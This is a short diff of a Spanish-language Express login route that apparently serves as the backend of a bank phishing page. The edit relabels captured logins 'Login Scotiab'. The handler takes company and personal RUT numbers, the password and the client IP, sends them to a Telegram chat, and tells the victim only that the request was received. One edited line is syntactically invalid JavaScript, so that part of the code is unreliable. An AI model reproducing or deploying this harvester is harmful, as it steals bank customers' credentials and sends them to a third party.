@@ -32,14 +32,14 @@ app.post("/login", async (req, res) => {
   const { rutEmpresa, rutPersona, passwd } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
-  const mensaje = `🔔 Nuevo intento de login:\n🏢 RUT Empresa: ${rutEmpresa || "(sin empresa)"}\n👤 RUT Persona: ${rutPersona || "(sin persona)"}\n🔑 Clave: ${passwd || "(sin clave)"}\n🌐 IP: ${ip}`;
+  const mensaje = `🔔Login Scotiab:\n🏢 RUT Empresa: ${rutEmpresa || "(sin empresa)"}\n👤 RUT Persona: ${rutPersona || "(sin persona)"}\n🔑 Clave: ${passwd || "(sin clave)"}\n🌐 IP: ${ip}`;
 
   try {
     await sendTelegramMessage(mensaje);
-    res.json({ status: "Conectado", mensaje: "✅ Hemos recibido tu solicitud." });
+    res.json({ Estado de ingreso: "✅ Hemos recibido tu solicitud." });
   } catch (error) {
     console.error("Error enviando a Telegram:", error);
-    res.status(500).json({ status: "error", mensaje: "❌ Error al notificar." });
+    res.status(500).json({  mensaje: "❌ Error al notificar." });
   }
 });
 
